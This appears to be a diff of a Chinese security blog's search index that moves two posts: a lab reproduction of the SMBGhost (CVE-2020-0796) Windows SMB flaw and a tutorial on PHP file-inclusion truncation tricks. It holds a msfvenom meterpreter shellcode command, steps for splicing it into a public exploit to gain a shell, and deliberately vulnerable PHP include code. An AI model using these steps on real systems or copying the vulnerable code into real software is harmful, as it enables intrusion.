@@ -75,6 +75,87 @@ iptables -L -n --line-number
       </tags>
   </entry>
   <entry>
+    <title>CVE-2020-0796（永恒之黑)漏洞复现</title>
+    <url>/2021/04/10/CVE_2020_0796(%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="CVE-2020-0796（永恒之黑"><a href="#CVE-2020-0796（永恒之黑" class="headerlink" title="CVE-2020-0796（永恒之黑)"></a>CVE-2020-0796（永恒之黑)</h1><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><blockquote>
+<p>SMB远程代码执行漏洞</p>
+<p>SMB 3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。攻击者利用该漏洞无需权限即可实现远程代码执行，受黑客攻击的目标系统只需要开机在线就有可能被入侵</p>
+<p>Windows 10和Windows Server 2016引入了SMB 3.1.1，本次漏洞源于SMBv3没有正确处理压缩的数据包，在解压数据包的时候使用客户端传过来的长度进行解压时，并没有检查长度是否合法，最终导致整数溢出</p>
+<p>利用该漏洞，黑客可直接远程攻击SMB服务端远程执行恶意代码，也可以通过构建恶意SMB服务端诱导客户端连接从而大规模攻击客户端</p>
+</blockquote>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><pre><code>Windows 10 Version 1903 for 32-bit Systems
+Windows 10 Version 1903 for x64-based Systems
+Windows 10 Version 1903 for ARM64-based Systems
+Windows Server, Version 1903 (Server Core installation)
+Windows 10 Version 1909 for 32-bit Systems
+Windows 10 Version 1909 for x64-based Systems
+Windows 10 Version 1909 for ARM64-based Systems
+Windows Server, Version 1909 (Server Core installation)
+</code></pre>
+<p><strong>漏洞复现工具下载</strong></p>
+<p>漏洞检测工具：<a href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip</a></p>
+<p>攻击poc：<a href="https://github.com/eerykitty/CVE-2020-0796-PoC">https://github.com/eerykitty/CVE-2020-0796-PoC</a></p>
+<p>shell脚本：<a href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p>
+<h2 id="蓝屏复现"><a href="#蓝屏复现" class="headerlink" title="蓝屏复现"></a>蓝屏复现</h2><p><strong>环境</strong></p>
+<pre><code>目标机：Windows 10 1903     ip: 10.7.1.111（虚拟机）
+攻击机：Windows 10 20H2        ip: 10.7.6.254（物理机）
+</code></pre>
+<ol>
+<li><strong>将目标机的防火墙关闭</strong></li>
+<li><strong>在攻击机上对目标机进行检测，看其是否存在漏洞。</strong></li>
+</ol>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165146258.png" alt="image-20210224165146258"></p>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165221346.png" alt="image-20210224165221346"></p>
+<ol start="3">
+<li><strong>利用下载的poc脚本发起攻击</strong></li>
+</ol>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165539611.png" alt="image-20210224165539611"></p>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165647306.png" alt="image-20210224165647306"></p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p><strong>环境</strong></p>
+<pre><code>目标机：Windows 10 1903     ip: 10.7.1.111（虚拟机）
+攻击机：Windows 10 20H2        ip: 10.7.6.254（物理机）
+</code></pre>
+<ol>
+<li><strong>生成一个反弹木马</strong></li>
+</ol>
+<pre class=" language-shell"><code class="language-shell">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=8888 -b '\x00' -i 1 -f python
+
+   说明: 
+   #-p payload
+   #-e 编码方式
+   #-i 编码次数
+   #-b 过滤坏字符
+   #LHOST,LPORT 监听上线的主机IP和端口
+   #-f python 生成python格式
+   #‘\x00‘转义字符，对应ascall码中为null，因为是二进制文件所以会出现，在python中作为结束的标志，有点相当于%00截断的感觉。
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170157500.png" alt="image-20210224170157500"></p>
+<ol start="2">
+<li><strong>用生成的shellcode将shell脚本工具里面的exploit.py中的user_payload替换掉。保留前面的名字，只替换内容</strong></li>
+</ol>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170414954.png" alt="image-20210224170414954"></p>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170436001.png" alt="image-20210224170436001"></p>
+<ol start="3">
+<li><strong>开启msf监听模块</strong></li>
+</ol>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170630883.png" alt="image-20210224170630883"></p>
+<ol start="4">
+<li><strong>运行exploit.py脚本，发起攻击反弹shell</strong></li>
+</ol>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224171104264.png" alt="image-20210224171104264"></p>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224171704173.png" alt="image-20210224171704173"></p>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224171715265.png" alt="image-20210224171715265"></p>
+<blockquote>
+<p>这个脚本有点问题，要多试几次才能得到shell，不用着急。这个脚本有时候会把靶机打蓝屏，重启一下靶机就好了，继续执行脚本知道得到shell。</p>
+</blockquote>
+]]></content>
+      <tags>
+        <tag>复现</tag>
+        <tag>Windows 10</tag>
+        <tag>SMB</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>MySQL提权</title>
     <url>/2021/04/11/MySQL%E6%8F%90%E6%9D%83/</url>
     <content><![CDATA[<h1 id="MySQL提权"><a href="#MySQL提权" class="headerlink" title="MySQL提权"></a>MySQL提权</h1><blockquote>
@@ -250,87 +331,6 @@ exploit
       <tags>
         <tag>MySQL</tag>
         <tag>提权</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CVE-2020-0796（永恒之黑)漏洞复现</title>
-    <url>/2021/04/10/CVE_2020_0796(%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="CVE-2020-0796（永恒之黑"><a href="#CVE-2020-0796（永恒之黑" class="headerlink" title="CVE-2020-0796（永恒之黑)"></a>CVE-2020-0796（永恒之黑)</h1><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><blockquote>
-<p>SMB远程代码执行漏洞</p>
-<p>SMB 3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。攻击者利用该漏洞无需权限即可实现远程代码执行，受黑客攻击的目标系统只需要开机在线就有可能被入侵</p>
-<p>Windows 10和Windows Server 2016引入了SMB 3.1.1，本次漏洞源于SMBv3没有正确处理压缩的数据包，在解压数据包的时候使用客户端传过来的长度进行解压时，并没有检查长度是否合法，最终导致整数溢出</p>
-<p>利用该漏洞，黑客可直接远程攻击SMB服务端远程执行恶意代码，也可以通过构建恶意SMB服务端诱导客户端连接从而大规模攻击客户端</p>
-</blockquote>
-<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><pre><code>Windows 10 Version 1903 for 32-bit Systems
-Windows 10 Version 1903 for x64-based Systems
-Windows 10 Version 1903 for ARM64-based Systems
-Windows Server, Version 1903 (Server Core installation)
-Windows 10 Version 1909 for 32-bit Systems
-Windows 10 Version 1909 for x64-based Systems
-Windows 10 Version 1909 for ARM64-based Systems
-Windows Server, Version 1909 (Server Core installation)
-</code></pre>
-<p><strong>漏洞复现工具下载</strong></p>
-<p>漏洞检测工具：<a href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip</a></p>
-<p>攻击poc：<a href="https://github.com/eerykitty/CVE-2020-0796-PoC">https://github.com/eerykitty/CVE-2020-0796-PoC</a></p>
-<p>shell脚本：<a href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p>
-<h2 id="蓝屏复现"><a href="#蓝屏复现" class="headerlink" title="蓝屏复现"></a>蓝屏复现</h2><p><strong>环境</strong></p>
-<pre><code>目标机：Windows 10 1903     ip: 10.7.1.111（虚拟机）
-攻击机：Windows 10 20H2        ip: 10.7.6.254（物理机）
-</code></pre>
-<ol>
-<li><strong>将目标机的防火墙关闭</strong></li>
-<li><strong>在攻击机上对目标机进行检测，看其是否存在漏洞。</strong></li>
-</ol>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165146258.png" alt="image-20210224165146258"></p>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165221346.png" alt="image-20210224165221346"></p>
-<ol start="3">
-<li><strong>利用下载的poc脚本发起攻击</strong></li>
-</ol>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165539611.png" alt="image-20210224165539611"></p>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165647306.png" alt="image-20210224165647306"></p>
-<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p><strong>环境</strong></p>
-<pre><code>目标机：Windows 10 1903     ip: 10.7.1.111（虚拟机）
-攻击机：Windows 10 20H2        ip: 10.7.6.254（物理机）
-</code></pre>
-<ol>
-<li><strong>生成一个反弹木马</strong></li>
-</ol>
-<pre class=" language-shell"><code class="language-shell">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=8888 -b '\x00' -i 1 -f python
-
-   说明: 
-   #-p payload
-   #-e 编码方式
-   #-i 编码次数
-   #-b 过滤坏字符
-   #LHOST,LPORT 监听上线的主机IP和端口
-   #-f python 生成python格式
-   #‘\x00‘转义字符，对应ascall码中为null，因为是二进制文件所以会出现，在python中作为结束的标志，有点相当于%00截断的感觉。
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170157500.png" alt="image-20210224170157500"></p>
-<ol start="2">
-<li><strong>用生成的shellcode将shell脚本工具里面的exploit.py中的user_payload替换掉。保留前面的名字，只替换内容</strong></li>
-</ol>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170414954.png" alt="image-20210224170414954"></p>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170436001.png" alt="image-20210224170436001"></p>
-<ol start="3">
-<li><strong>开启msf监听模块</strong></li>
-</ol>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170630883.png" alt="image-20210224170630883"></p>
-<ol start="4">
-<li><strong>运行exploit.py脚本，发起攻击反弹shell</strong></li>
-</ol>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224171104264.png" alt="image-20210224171104264"></p>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224171704173.png" alt="image-20210224171704173"></p>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224171715265.png" alt="image-20210224171715265"></p>
-<blockquote>
-<p>这个脚本有点问题，要多试几次才能得到shell，不用着急。这个脚本有时候会把靶机打蓝屏，重启一下靶机就好了，继续执行脚本知道得到shell。</p>
-</blockquote>
-]]></content>
-      <tags>
-        <tag>复现</tag>
-        <tag>Windows 10</tag>
-        <tag>SMB</tag>
       </tags>
   </entry>
   <entry>
@@ -645,6 +645,66 @@ run
       <tags>
         <tag>复现</tag>
         <tag>LNK</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件包含漏洞-文件包含截断</title>
+    <url>/2021/05/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%88%AA%E6%96%AD/</url>
+    <content><![CDATA[<h1 id="文件包含截断"><a href="#文件包含截断" class="headerlink" title="文件包含截断"></a>文件包含截断</h1><h2 id="利用-00截断"><a href="#利用-00截断" class="headerlink" title="利用%00截断"></a>利用<code>%00</code>截断</h2><p><code>%00</code>截断受限于<code>GPC</code>和<code>addslashes()</code>等函数。也就是说<strong>在开启GPC或者使用过滤函数过滤的情况下不能使用</strong>，在<strong>PHP 5.3</strong>之后的版本全面修复了文件名<code>%00</code>截断的问题。</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210505100907925.png" alt="image-20210505100907925"></p>
+<blockquote>
+<p>当url参数被过滤时</p>
+<p><code>%00</code>被转义成了0<code>    </code>0两个单体字符，不再具有截断功能</p>
+</blockquote>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210505101258523.png" alt="image-20210505101258523"></p>
+<h2 id="利用-截断"><a href="#利用-截断" class="headerlink" title="利用./截断"></a>利用<code>./</code>截断</h2><p>利用多个<code>./</code>来截断，这种方式不受限于<code>GPC</code>，但是同样在PHP 5.3版本之后被修复。</p>
+<blockquote>
+<p>在windows下使用240个点(<code>.</code>)连接可以截断</p>
+</blockquote>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
+<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token number">240</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token variable">$str</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'.'</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">'2.txt'</span><span class="token punctuation">.</span><span class="token variable">$str</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
+<span class="token keyword">include</span> <span class="token variable">$str</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210505104813141.png" alt="image-20210505104813141"></p>
+<blockquote>
+<p>在windows下，<code>./</code>共240个能够截断。</p>
+</blockquote>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
+<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token variable">$str</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'./'</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">'2.txt'</span><span class="token punctuation">.</span><span class="token variable">$str</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
+<span class="token keyword">include</span> <span class="token variable">$str</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210505105544640.png" alt="image-20210505105544640"></p>
+<blockquote>
+<p>linux下需要2038个<code>./</code>组合才能截断。</p>
+</blockquote>
+<h2 id="利用-伪截断"><a href="#利用-伪截断" class="headerlink" title="利用?伪截断"></a>利用<code>?</code>伪截断</h2><p>远程包含时利用问号<code>?</code>来截断，不受GPC和PHP版本的影响，只要能够返回代码给包含函数，它就能执行。</p>
+<p>在HTTP协议中，访问<code>http://remotehost/1.txt</code>和访问<code>httpL://remotehost/1.txt?.php</code>的返回结果是一样的，因为这时候WebServer把<code>?</code>之后的内容当作是请求参数，而<code>txt</code>不在WebServer里面解析，参数对访问<code>1.txt</code>返回的内容不影响，于是就实现了伪截断。</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">echo</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>
+<span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210505110633801.png" alt="image-20210505110633801"></p>
+]]></content>
+      <tags>
+        <tag>文件包含</tag>
+        <tag>Web</tag>
       </tags>
   </entry>
   <entry>
@@ -1260,66 +1320,6 @@ s<span class="token punctuation">.</span>recv<span class="token punctuation">(</
       <tags>
         <tag>复现</tag>
         <tag>缓冲区溢出</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件包含漏洞-文件包含截断</title>
-    <url>/2021/05/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%88%AA%E6%96%AD/</url>
-    <content><![CDATA[<h1 id="文件包含截断"><a href="#文件包含截断" class="headerlink" title="文件包含截断"></a>文件包含截断</h1><h2 id="利用-00截断"><a href="#利用-00截断" class="headerlink" title="利用%00截断"></a>利用<code>%00</code>截断</h2><p><code>%00</code>截断受限于<code>GPC</code>和<code>addslashes()</code>等函数。也就是说<strong>在开启GPC或者使用过滤函数过滤的情况下不能使用</strong>，在<strong>PHP 5.3</strong>之后的版本全面修复了文件名<code>%00</code>截断的问题。</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span>
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210505100907925.png" alt="image-20210505100907925"></p>
-<blockquote>
-<p>当url参数被过滤时</p>
-<p><code>%00</code>被转义成了0<code>    </code>0两个单体字符，不再具有截断功能</p>
-</blockquote>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210505101258523.png" alt="image-20210505101258523"></p>
-<h2 id="利用-截断"><a href="#利用-截断" class="headerlink" title="利用./截断"></a>利用<code>./</code>截断</h2><p>利用多个<code>./</code>来截断，这种方式不受限于<code>GPC</code>，但是同样在PHP 5.3版本之后被修复。</p>
-<blockquote>
-<p>在windows下使用240个点(<code>.</code>)连接可以截断</p>
-</blockquote>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
-<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token number">240</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
-    <span class="token variable">$str</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'.'</span><span class="token punctuation">;</span>
-<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
-<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">'2.txt'</span><span class="token punctuation">.</span><span class="token variable">$str</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
-<span class="token keyword">include</span> <span class="token variable">$str</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span>
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210505104813141.png" alt="image-20210505104813141"></p>
-<blockquote>
-<p>在windows下，<code>./</code>共240个能够截断。</p>
-</blockquote>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
-<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
-    <span class="token variable">$str</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'./'</span><span class="token punctuation">;</span>
-<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
-<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">'2.txt'</span><span class="token punctuation">.</span><span class="token variable">$str</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
-<span class="token keyword">include</span> <span class="token variable">$str</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span>
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210505105544640.png" alt="image-20210505105544640"></p>
-<blockquote>
-<p>linux下需要2038个<code>./</code>组合才能截断。</p>
-</blockquote>
-<h2 id="利用-伪截断"><a href="#利用-伪截断" class="headerlink" title="利用?伪截断"></a>利用<code>?</code>伪截断</h2><p>远程包含时利用问号<code>?</code>来截断，不受GPC和PHP版本的影响，只要能够返回代码给包含函数，它就能执行。</p>
-<p>在HTTP协议中，访问<code>http://remotehost/1.txt</code>和访问<code>httpL://remotehost/1.txt?.php</code>的返回结果是一样的，因为这时候WebServer把<code>?</code>之后的内容当作是请求参数，而<code>txt</code>不在WebServer里面解析，参数对访问<code>1.txt</code>返回的内容不影响，于是就实现了伪截断。</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token keyword">echo</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>
-<span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span>
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210505110633801.png" alt="image-20210505110633801"></p>
-]]></content>
-      <tags>
-        <tag>文件包含</tag>
-        <tag>Web</tag>
       </tags>
   </entry>
 </search>
